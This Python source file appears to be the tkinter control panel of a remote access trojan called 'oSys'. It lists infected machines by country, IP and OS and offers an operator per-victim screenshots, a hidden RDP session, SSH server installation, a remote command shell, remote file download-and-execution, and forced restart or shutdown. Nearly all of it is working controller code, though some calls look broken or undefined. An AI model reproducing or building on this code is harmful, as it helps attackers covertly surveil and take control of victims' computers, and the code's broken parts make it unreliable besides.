import tkinter as tk
from tkinter import ttk
import config
import requests
from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot

class Window(tk.Tk):
    def __init__(self):
        """ Initiates the main GUI window. """
        super().__init__()
        self.title("oSys - Panel Dashboard | Version: 1.0")
        self.geometry("530x350")
        self.menu = Menu([0])

        # Create a top-level layout
        layout = tk.Frame(self)
        layout.pack(fill=tk.BOTH, expand=True)
        layout.columnconfigure(0, weight=1)
        layout.rowconfigure(0, weight=1)
        layout.rowconfigure(1, weight=0)

        layout.add(tk.Frame(layout, height=10), 0, 0)

        dashboard_tab = self.dashboard_ui(layout)
        dashboard_tab.grid(row=0, column=0, sticky="nsew")

        # Auto-Update Table data
        self.update_invoker = self.after(config.UPDATE_TABLE_COOLDOWN, self._update_table_data)

    # --- UI Tabs ---
    def dashboard_ui(self, parent):
        """ :return: the dashboard ui as a widget"""
        # Panel Dashboard Table Widget
        self.table = ttk.Treeview(parent, columns=('Country', 'Name', 'IP', 'OS', 'Task menu'))
        self.table.heading('#0', text=' ')
        self.table.heading('Country', text='Country')
        self.table.heading('Name', text='Name')
        self.table.heading('IP', text='IP')
        self.table.heading('OS', text='OS')
        self.table.heading('Task menu', text='Task menu')
        self.table.column('#0', width=20, stretch=False)
        self.table.column('Country', width=50, stretch=False)
        self.table.column('Name', width=100, stretch=False)
        self.table.column('IP', width=100, stretch=False)
        self.table.column('OS', width=100, stretch=False)
        self.table.column('Task menu', width=100, stretch=False)
        self.table.grid(row=0, column=0, sticky="nsew")

        # Load table data
        self._update_table_data()

        # Set Selection buttons
        button_layout = tk.Frame(parent)
        button_layout.grid(row=1, column=0, sticky="nsew")
        select_all_button = tk.Button(button_layout, text="Select all", command=lambda: self._select_all_rows(select_state=True))
        deselect_all_button = tk.Button(button_layout, text="De-Select all", command=lambda: self._select_all_rows(select_state=False))
        selected_users_menu_button = tk.Button(button_layout, text="Menu - Selected Users", command=self._create_menu_selected)
        select_all_button.pack(side=tk.LEFT, padx=5, pady=5)
        deselect_all_button.pack(side=tk.LEFT, padx=5, pady=5)
        selected_users_menu_button.pack(side=tk.LEFT, padx=5, pady=5)

        return parent

    @staticmethod
    def no_selected_users_error_ui():
        """ Pops up an error message. """
        popup = tk.messagebox.showerror("Error!", "No users selected")

    def destroy(self):
        """ Pops up a warning message asking the user if he's sure he wants to close the program. """
        close = tk.messagebox.askyesno('Server Is Running', 'Are you sure you want to close the program?')
        if close:
            super().destroy()

    # --- Private functions ---
    def _update_table_data(self):
        """ This function updates the table according to the client list. """
        # Checks connections are still alive
        current_target = 0
        for client in config.client_list:
            try:
                conn = client['data']['socket']
                conn.send(''.encode())
                current_target += 1
            except:
                config.delete_client(current_target)
                self.menu.setVisible(False)

        # Updates the table data
        self.table.delete(*self.table.get_children())
        for i in range(len(config.client_list)):
            checkbox = ttk.Checkbutton(self.table, command=(lambda i: lambda: self._on_checkbox_click(i))(i))
            checkbox.state(['!alternate'])
            checkbox.state(['selected'] if i in config.targets else [])
            checkbox.grid(row=i, column=0, sticky="nsew")
            self.table.insert('', 'end', text='', values=(config.client_list[i]['data']['countryCode'], config.client_list[i]['data']['name'], config.client_list[i]['ip'], config.client_list[i]['data']['os'], 'Menu {}'.format(i + 1)), iid=i)

        # Auto-Update Table data
        self.update_invoker = self.after(config.UPDATE_TABLE_COOLDOWN, self._update_table_data)

    def _on_checkbox_click(self, target):
        """
        This function is being activated upon checkbox click.
        This function sets the value adds the client to the targets list if it's ticked. Else, it removes it.
        :parm target: Number of client
        """
        if target in config.targets:
            config.targets.remove(target)
        else:
            config.targets.append(target)

    def _select_all_rows(self, select_state):
        """
        This function will select/de-select all the rows in the table
        :param select_state: Selection state. True=Ticked | False=Un-ticked
        """
        for i in range(len(config.client_list)):
            if select_state:
                if i not in config.targets:
                    config.targets.append(i)
            else:
                if i in config.targets:
                    config.targets.remove(i)
        self._update_table_data()

    def _create_menu_selected(self):
        """ This function creates a menu panel for all of the selected targets. If no target was selected, a error message would pop up"""
        if len(config.targets) > 0:
            self._create_menu(config.targets)
        else:
            self.no_selected_users_error_ui()

    def _create_menu(self, targets):
        """ Creates a new menu - Closes old one. """
        self.menu.destroy()
        self.menu = Menu(targets)
        self.menu.mainloop()

from tkinter import *
from tkinter import ttk

class Menu(Frame):
    def __init__(self, target_list):
        """ Initiates the control panel """
        super().__init__()
        title = 'oSys - Menu ' + (str(target_list[0] + 1) if len(target_list) < 2 else 'for selected users')
        self.master.title(title)
        self.master.geometry('530x350')
        self.master.protocol("WM_DELETE_WINDOW", self.closeEvent)
        self.master.resizable(False, False)
        self.master.config(bg='white')
        self.master.columnconfigure(0, weight=1)
        self.master.rowconfigure(0, weight=1)
        self.grid(sticky=N+S+E+W)

        # Create a top-level layout
        layout = ttk.Frame(self)
        layout.grid(sticky=N+S+E+W)

        # Create multiple tabs for each of the modules using their UI widgets
        tabs = ttk.Notebook(layout)
        if len(target_list) < 2:
            tabs.add(self.surveillance_ui(), text="Surveillance")
        tabs.add(self.shell_ui(), text="Shell")
        tabs.add(self.file_ui(), text="File")
        tabs.add(self.power_ui(), text="Power")
        tabs.grid(row=0, column=0, sticky=N+S+E+W)

    def closeEvent(self):
        """ Enables the option to select clients in the client panel """
        config.WIN._set_row_selection_state(True)

    # --- UI Tabs ---
    def surveillance_ui(self):
        """ :return: the surveillance ui as a widget """
        # Creates Layout
        layout = ttk.Frame(self)

        # Creates buttons
        screen_shot_button = ttk.Button(layout, text="Screenshot", command=self.screenshot_clicked)
        install_ssh_server_button = ttk.Button(layout, text="Install SSH Server", command=self.install_ssh_server_clicked)
        uninstall_ssh_server_button = ttk.Button(layout, text="Uninstall SSH Server", command=self.uninstall_ssh_server_clicked)
        start_hrdp_button = ttk.Button(layout, text="Start HRDP", command=self.start_hrdp_clicked)
        stop_hrdp_button = ttk.Button(layout, text="Stop HRDP", command=self.stop_hrdp_clicked)

        # Adds buttons to the layout
        screen_shot_button.grid(row=0, column=0, pady=5)
        install_ssh_server_button.grid(row=1, column=0, pady=5)
        uninstall_ssh_server_button.grid(row=2, column=0, pady=5)
        start_hrdp_button.grid(row=3, column=0, pady=5)
        stop_hrdp_button.grid(row=4, column=0, pady=5)

        return layout

    def shell_ui(self):
        """ :return: the shell ui as a widget"""
        # Creates a layout
        layout = ttk.Frame(self)

        # Creates text objects
        self.shell_output = Text(layout, wrap=WORD, state=DISABLED)
        self.shell_output.grid(row=0, column=0, sticky=N+S+E+W, pady=5, padx=5)
        command_input = ttk.Entry(layout)
        command_input.grid(row=1, column=0, sticky=N+S+E+W, pady=5, padx=5)
        command_input.focus()

        # Creates buttons
        button_layout = ttk.Frame(layout)

        run_command_button = ttk.Button(button_layout, text='Run Command', command=lambda: self.send_shell_command(command_input.get().strip()))
        clear_console_button = ttk.Button(button_layout, text='Clear', command=self.shell_output.delete('1.0', END))

        # Adds buttons to the layout
        run_command_button.grid(row=0, column=0, pady=5, padx=5)
        clear_console_button.grid(row=0, column=1, pady=5, padx=5)
        button_layout.grid(row=2, column=0, pady=5, padx=5)

        return layout

    def file_ui(self):
        """ :return: the file tab ui as a widget"""
        # Creates layout
        layout = ttk.Frame(self)

        # Creates button and text object
        button_upload = ttk.Button(layout, text='Upload file', command=self.upload_file_clicked)
        self.file_url_textbox = ttk.Entry(layout)
        self.file_url_textbox.grid(row=0, column=0, sticky=N+S+E+W, pady=5, padx=5)
        self.file_url_textbox.focus()

        # Adds buttons to the layout
        button_upload.grid(row=1, column=0, pady=5, padx=5)

        return layout

    def power_ui(self):
        """ :return: the power ui as a widget"""
        # Creates Layout
        layout = ttk.Frame(self)

        # Creates buttons
        restart_button = ttk.Button(layout, text="Restart", command=self.restart_clicked)
        shutdown_button = ttk.Button(layout, text="Shut down", command=self.shutdown_clicked)

        # Adds buttons to the layout
        restart_button.grid(row=0, column=0, pady=5, padx=5)
        shutdown_button.grid(row=1, column=0, pady=5, padx=5)

        return layout

    # --- Button Functions ---
    @staticmethod
    def restart_clicked():
        """ Initiates the restart module. """
        Power.restart()

    @staticmethod
    def shutdown_clicked():
        """ Initiates the power module. """
        Power.shutdown()

    @staticmethod
    def screenshot_clicked():
        """ Initiates the screenshot module. """
        Screenshot.screenshot()

    @staticmethod
    def install_ssh_server_clicked():
        """ Initiates the SSH Server installer in the hrdp module. """
        HRDP.install_ssh_server()

    @staticmethod
    def uninstall_ssh_server_clicked():
        """ Initiates the SSH Server uninstaller in the hrdp module. """
        HRDP.uninstall_ssh_server()

    @staticmethod
    def start_hrdp_clicked():
        """ Initiates the Hidden RDP in the hrdp module. """
        HRDP.start()

    @staticmethod
    def stop_hrdp_clicked():
        """ Stops the SSH Server in the hrdp module. """
        HRDP.stop()

    def upload_file_clicked(self):
        """ Initiates the remote file download&execution module. """
        Execute.upload(self.file_url_textbox.get())
        self.file_url_textbox.delete(0, END)

    def send_shell_command(self, command):
        """
        This function would send a shell command to the client and show the response in the self.shell_output text object
        :param command: cmd command to operate
        """
        output = Shell.shell(command)
        self.shell_output.config(state=NORMAL)
        self.shell_output.delete('1.0', END)
        self.shell_output.insert(END, output)
        self.shell_output.config(state=DISABLED)

def start():
    """ Starts the GUI. """
    root = tk.Tk()
    config.WIN = Window()
    config.WIN.mainloop()

start()